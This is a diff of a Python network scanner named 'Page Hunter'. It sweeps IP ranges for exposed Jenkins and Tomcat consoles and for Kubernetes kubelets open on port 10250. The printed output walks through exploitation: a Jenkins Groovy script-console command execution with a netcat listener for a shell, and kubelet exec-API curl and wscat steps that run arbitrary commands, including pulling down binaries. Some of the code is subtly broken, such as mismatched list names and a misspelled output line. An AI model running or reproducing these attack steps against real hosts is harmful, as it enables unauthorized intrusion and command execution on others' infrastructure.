@@ -17,8 +17,8 @@ print("*                      |          __   |   __   __                       
 print("*                      |__  |  | |  | _|_ |__| |  |                           *")
 print("*                      |  | |__| |  |  |   \__ |                              *")
 print("*                                                                             *")  
-print("* Page Hunter v1.0                                                            *")
-print("* Author: Cedric Owens (@cedowens)                                            *")
+print("* Page Hunter v1.1                                                            *")
+print("* Author: @cedowens                                                           *")
 print("* Independent Project                                                         *")
 print("\033[33m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m")
 
@@ -32,9 +32,16 @@ consolelist = []
 iplist = []
 iprange = input("Enter IP range to check: ").strip()
 port2 = 8080
+port3 = 10250
 numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
 outfile = open("outfile.txt","w")
 portopenlist = []
+portopenlist2 = []
+unauthexeclist = []
+nulllist = []
+authexec = []
+unsuccessful = []
+
 def Connector(ip):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,25 +53,45 @@ def Connector(ip):
             outfile.write("Port " + str(port2) + " OPEN on %s\n" % str(ip))
             portopenlist.append(str(ip))
         else:
-            print(" " + str(ip) + ":" + str(port2))
+            pass
+            
+    except:
+        pass
+
+def Connector2(ip):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1.0)
+        result = sock.connect_ex((str(ip),10250))
+        sock.close()
+        if result == 0:
+            print("\033[92mPort 10250 OPEN on %s\033[0m" % str(ip))
+            outfile.write("Porrt 10250 OPEN on %s\n" % str(ip))
+            portopenlist2.append(str(ip))
+        else:
+            pass
+    except:
+        pass
         
-    except Exception as e:
-        print(e)
 
 def threader():
     while True:
         worker = q.get()
+        worker4 = q4.get()
         Connector(worker)
+        Connector2(worker4)
         q.task_done()
+        q4.task_done()
 
 
 
-def jenkinschecker(host):
-    url = "http://" + host + ":" + str(port2) + "/script"
-    url2 = "http://" + host + ":" + str(port2) + "/manager/html"
-    url3 = "http://" + host + ":" + str(port2) + "/manager/text"
-    url4 = "http://" + host + ":" + str(port2) + "/console"
-    url5 = "http://" + host + ":" + str(port2) + "/command"
+def pagechecker(host):
+    url = "http://" + host + ":8080/script"
+    url2 = "http://" + host + ":8080/manager/html"
+    url3 = "http://" + host + ":8080/manager/text"
+    url4 = "http://" + host + ":8080/console"
+    url5 = "http://" + host + ":8080/command"
+ 
     
     try:
         response = requests.get(url, timeout=1)
@@ -127,15 +154,47 @@ def jenkinschecker(host):
     except requests.exceptions.RequestException:
         pass
 
+def kubechecker(host):
+    url6 = "https://" + host + ":" + str(port3) + "/pods"
+    try:
+        response6 = requests.get(url6, verify=False, timeout=1)
+
+        if (response6.status_code == 200 and ('namespace' in response6.text or 'Namespace' in response6.text) and ('pod' in response6.text or 'Pod' in response6.text)):
+            print("+"*40)
+            print("\033[91mKubernetes node allowing system:anonymous viewing of pods found: %s\033[0m" % url6)
+            outfile.write("Kubernetes node allowing system:anonymous viewing of pods found:\n")
+            outfile.write(url6)
+            outfile.write("\n")
+            unauthexec.append(url6)
+        elif (response6.status_code == 200 and '"items":null' in response6.text):
+            print("+"*40)
+            print("\033[33mKubernetes node with null PodList: %s\033[0m" % url6)
+            outfile.write("Kubernetes node with null PodList:\n")
+            outfile.write(url6)
+            outfile.write("\n")
+            nulllist.append(url6)
+        elif response6.status_code == 401 or response6.status_code == 403:
+            print("+"*40)
+            print('\033[33mKubernetes node returned "unauthorized" response: %s\033[0m' % url6)
+            outfile.write('Kubernetes node returned "unauthorized" response:\n')
+            outfile.write(url6)
+            outfile.write("\n")
+            authexec.append(url6)
+        else:
+            pass
+    except:
+        pass
+
 
 def threader2():
     while True:
         worker2 = q2.get()
-        jenkinschecker(worker2)
+        pagechecker(worker2)
         q2.task_done()
 
 q = Queue()
 
+q4 = Queue()
 
 for ip in ipaddress.IPv4Network(iprange):
     count = count + 1
@@ -151,10 +210,18 @@ for x in range(int(numthreads)):
 for worker in iplist:
     q.put(worker)
 
+for worker4 in iplist:
+    q4.put(worker4)
 
 
 q.join()
+q4.join()
 
+def threader3():
+    while True:
+        worker3 = q3.get()
+        kubechecker(worker3)
+        q3.task_done()
 
 q2 = Queue()
 
@@ -169,6 +236,19 @@ for worker2 in portopenlist:
 
 q2.join()
 
+q3 = Queue()
+
+for z in range(200):
+    t3 = threading.Thread(target=threader3)
+    t3.daemon = True
+    t3.start()
+
+for worker3 in portopenlist2:
+    item = str(ipaddress.IPv4Address(worker3))
+    q3.put(item)
+
+q3.join()
+
 if unauthjenkins != []:
     print("+"*40)
     print("If Jenkins is running on Linux, start a local netcat listener (ex: nc -nlvp <port>) and follow the steps here to get command shell access:")
@@ -179,6 +259,19 @@ if unauthjenkins != []:
     print("def proc = 'cmd.exe /c <command>'.execute()")
     print("proc.waitForKill(1000)")
     print('println "out> $sout err> $serr"')
+
+if unauthexeclist != []:
+    print("+"*40)
+    print("Since it appears you found at least 1 kubernetes node allowing unauthenticated exec API access, try the following steps to gain command execution:")
+    print("1. Pick a namespace, pod, and container name from the /pods results on the kubernetes node.")
+    print('2. Run the following curl command: curl -k -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://<kube-node>:10250/exec/<namespace>/<pod>/<container>?command=id&input=1&output=1&tty=1"')
+    print('3. In the server response, look for the Location: <value>. You will next open a web socket to that location')
+    print('4. Assuming use of wscat from your attack host, run: wscat -c "https://<kube-node>:10250/<location-path-value>" --no-check')
+    print('5. Your wscat results from #4 above will show the results of the shell command executed. In this case the "id" command was run.')
+    print('6. You can replace the "id" command with any other commands you want, such as curl to pull down binaries. If using curl, you will have one command value for each curl function (ex:command=curl&command="<url>"&command="-O" to download and write a file do disk)')
+else:
+    print("+"*40)
+    print("No Kubernetes nodes with unauthenticated exec API access found.")
 
 if unauthjenkins == []:
     print("+"*40)
